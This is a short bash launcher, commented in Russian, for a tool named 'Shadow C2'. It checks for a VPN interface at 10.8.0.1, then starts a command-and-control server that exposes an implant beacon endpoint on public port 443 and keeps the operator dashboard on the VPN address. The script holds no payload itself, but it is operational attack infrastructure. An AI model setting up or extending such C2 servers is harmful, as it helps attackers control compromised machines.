#!/bin/bash
# Shadow C2 - Run with VPN interface
# Запускает админку на VPN интерфейсе 10.8.0.1

echo "╔══════════════════════════════════════════════════════════════════════════════╗"
echo "║                    SHADOW C2 WITH VPN SUPPORT                               ║"
echo "║                    Запуск с VPN интерфейсом 10.8.0.1                        ║"
echo "╚══════════════════════════════════════════════════════════════════════════════╝"

echo ""
echo "[+] Проверка VPN интерфейса..."

# Check if VPN interface exists
if ! ip addr show | grep -q "10.8.0.1"; then
    echo "[!] VPN интерфейс 10.8.0.1 не найден!"
    echo "[!] Убедитесь что VPN запущен и настроен"
    exit 1
fi

echo "[✓] VPN интерфейс 10.8.0.1 найден"
echo ""
echo "[+] Запускаем split server system..."
echo "    • Beacon endpoint: 0.0.0.0:443"
echo "    • Admin interface: 10.8.0.1:8080"
echo ""
echo "[+] Доступ к админке:"
echo "    • С VPN: http://10.8.0.1:8080/dashboard"
echo "    • С localhost: http://localhost:8080/dashboard"
echo ""
echo "[+] Для подключения к админке через VPN:"
echo "    • Убедитесь что вы подключены к VPN"
echo "    • Откройте http://10.8.0.1:8080/dashboard"
echo ""

# Run with VPN interface
python3 run_split_servers.py --admin-host 10.8.0.1